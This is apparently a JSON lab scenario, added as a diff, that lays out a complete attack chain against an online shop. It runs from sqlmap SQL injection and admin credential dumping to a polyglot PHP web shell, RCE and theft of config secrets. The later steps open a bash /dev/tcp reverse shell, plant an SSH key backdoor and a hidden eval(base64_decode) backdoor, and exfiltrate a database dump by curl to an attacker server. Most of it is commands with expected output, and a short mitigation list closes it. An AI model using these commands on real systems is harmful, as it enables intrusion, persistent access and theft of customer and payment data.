@@ -1,0 +1,154 @@
+{
+  "title": "From SQL Injection to Full Server Compromise",
+  "description": "Complete attack chain from initial SQL injection discovery to persistent backdoor deployment with database exfiltration",
+  "difficulty": "intermediate",
+  "estimated_time": "45 minutes",
+  "tools_used": [
+    "sqlmap",
+    "curl",
+    "nc",
+    "msfvenom",
+    "ssh-keygen"
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "title": "SQL Injection Discovery",
+      "command": "sqlmap -u 'http://shop.target.com/product.php?id=1' --batch --dbs",
+      "explanation": "Enumerate databases via SQL injection vulnerability in product.php parameter 'id'",
+      "expected_output": "Available databases: shop_db, information_schema, mysql. Vulnerable parameter confirmed with time-based blind injection.",
+      "success_criteria": "At least one non-default database discovered"
+    },
+    {
+      "step": 2,
+      "title": "Database Table Enumeration",
+      "command": "sqlmap -u 'http://shop.target.com/product.php?id=1' -D shop_db --tables",
+      "explanation": "List all tables in shop_db database to identify high-value targets",
+      "expected_output": "8 tables found including: users, admin_accounts, credit_cards, session_tokens",
+      "success_criteria": "admin_accounts or users table identified"
+    },
+    {
+      "step": 3,
+      "title": "Admin Credentials Extraction",
+      "command": "sqlmap -u 'http://shop.target.com/product.php?id=1' -D shop_db -T admin_accounts -C username,password,email --dump",
+      "explanation": "Extract admin usernames and password hashes, attempt to crack weak passwords",
+      "expected_output": "Admin credentials dumped: admin:$2y$10$92IXU... (cracked to 'admin123'), support_admin:$2y$10$8YnBj...",
+      "success_criteria": "At least one admin password cracked"
+    },
+    {
+      "step": 4,
+      "title": "Admin Panel Access",
+      "command": "curl -X POST http://shop.target.com/admin/login.php -d 'username=admin&password=admin123' -c cookies.txt -L",
+      "explanation": "Authenticate to admin panel using SQLi-extracted credentials",
+      "expected_output": "302 redirect to /admin/dashboard.php, session cookies set, admin access granted",
+      "success_criteria": "Successfully authenticated as administrator"
+    },
+    {
+      "step": 5,
+      "title": "File Upload Vulnerability Discovery",
+      "command": "curl -b cookies.txt http://shop.target.com/admin/dashboard.php | grep -i upload",
+      "explanation": "Enumerate admin panel features looking for file upload functionality",
+      "expected_output": "Found: Product Image Upload, Theme Customization Upload, Backup Import",
+      "success_criteria": "File upload functionality identified"
+    },
+    {
+      "step": 6,
+      "title": "PHP Web Shell Creation",
+      "command": "echo 'GIF89a;<?php if(isset($_GET[\"cmd\"])){system($_GET[\"cmd\"]);} ?>' > shell.php.gif",
+      "explanation": "Create polyglot file (valid GIF + PHP shell) to bypass file type validation",
+      "expected_output": "shell.php.gif created with GIF magic bytes and PHP code",
+      "success_criteria": "Polyglot file successfully created"
+    },
+    {
+      "step": 7,
+      "title": "Web Shell Upload",
+      "command": "curl -b cookies.txt -F 'file=@shell.php.gif' -F 'category=themes' http://shop.target.com/admin/upload.php",
+      "explanation": "Upload web shell via admin panel's theme upload feature",
+      "expected_output": "Upload successful: /uploads/themes/a1b2c3d4_shell.php.gif",
+      "success_criteria": "File uploaded and path returned"
+    },
+    {
+      "step": 8,
+      "title": "Remote Code Execution Test",
+      "command": "curl 'http://shop.target.com/uploads/themes/a1b2c3d4_shell.php.gif?cmd=whoami;id;pwd'",
+      "explanation": "Test web shell by executing system commands to confirm RCE",
+      "expected_output": "www-data\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n/var/www/html/uploads/themes",
+      "success_criteria": "Command output received, RCE confirmed"
+    },
+    {
+      "step": 9,
+      "title": "Database Configuration Exfiltration",
+      "command": "curl 'http://shop.target.com/uploads/themes/a1b2c3d4_shell.php.gif?cmd=cat%20/var/www/html/config/database.php'",
+      "explanation": "Extract database credentials and API keys from configuration files",
+      "expected_output": "DB credentials: db_admin:DbP@ssw0rd2024, AWS keys, Stripe API key extracted",
+      "success_criteria": "Sensitive credentials obtained"
+    },
+    {
+      "step": 10,
+      "title": "Reverse Shell Establishment",
+      "command": "nc -nlvp 4444 & sleep 1 && curl 'http://shop.target.com/uploads/themes/a1b2c3d4_shell.php.gif?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/10.10.14.50/4444%200%3E%261%22'",
+      "explanation": "Establish interactive reverse shell for better control and persistence",
+      "expected_output": "Connection received from 192.168.1.100:52341, interactive bash shell as www-data",
+      "success_criteria": "Interactive shell obtained"
+    },
+    {
+      "step": 11,
+      "title": "Privilege Escalation Enumeration",
+      "command": "find / -perm -4000 -type f 2>/dev/null",
+      "explanation": "Search for SUID binaries that might allow privilege escalation to root",
+      "expected_output": "Non-standard SUID: /usr/local/bin/backup_script, /opt/monitoring/check_status",
+      "success_criteria": "Custom SUID binaries identified"
+    },
+    {
+      "step": 12,
+      "title": "SSH Persistence Backdoor",
+      "command": "mkdir -p /var/www/.ssh && ssh-keygen -t rsa -N '' -f /tmp/backdoor && cat /tmp/backdoor.pub >> /var/www/.ssh/authorized_keys && chmod 700 /var/www/.ssh && chmod 600 /var/www/.ssh/authorized_keys",
+      "explanation": "Deploy SSH key-based backdoor for persistent access independent of web application",
+      "expected_output": "SSH key pair generated, public key added to www-data authorized_keys",
+      "success_criteria": "SSH access established: ssh -i /tmp/backdoor www-data@target.com"
+    },
+    {
+      "step": 13,
+      "title": "Hidden Web Backdoor Deployment",
+      "command": "echo '<?php @eval(base64_decode($_POST[\"x\"])); ?>' > /var/www/html/.favicon.ico.php",
+      "explanation": "Create hidden, obfuscated backdoor for redundant access if primary shell is discovered",
+      "expected_output": "Backdoor created: http://shop.target.com/.favicon.ico.php (POST param: x)",
+      "success_criteria": "Backdoor responds to encoded commands"
+    },
+    {
+      "step": 14,
+      "title": "Complete Database Dump",
+      "command": "mysqldump -u db_admin -pDbP@ssw0rd2024 shop_db > /tmp/shop_db.sql && curl -F 'file=@/tmp/shop_db.sql' http://10.10.14.50:8000/upload",
+      "explanation": "Dump entire database including customer PII, payment info, and exfiltrate to attacker server",
+      "expected_output": "Database dumped: 47 users, 1,203 orders, 856 payment records exfiltrated",
+      "success_criteria": "Full database backup obtained on attacker machine"
+    }
+  ],
+  "learning_objectives": [
+    "SQL injection exploitation for database enumeration and credential extraction",
+    "Leveraging stolen credentials for lateral movement to admin interfaces",
+    "File upload bypass techniques using polyglot files",
+    "Web shell deployment and remote code execution",
+    "Establishing multiple persistence mechanisms (SSH, hidden backdoors)",
+    "Data exfiltration techniques for sensitive information",
+    "Post-exploitation enumeration for privilege escalation opportunities"
+  ],
+  "mitigation": [
+    "Use parameterized queries to prevent SQL injection",
+    "Implement strong password policies and multi-factor authentication for admin accounts",
+    "Validate file uploads by content inspection, not just extension or MIME type",
+    "Configure web server to not execute scripts in upload directories",
+    "Implement file integrity monitoring for web application files",
+    "Use database encryption and minimize credentials in config files",
+    "Monitor for unusual SSH key additions and unexpected network connections",
+    "Implement application-level logging and SIEM integration"
+  ],
+  "tags": [
+    "sql_injection",
+    "authentication",
+    "file_upload",
+    "rce",
+    "persistence",
+    "data_exfiltration"
+  ]
+}
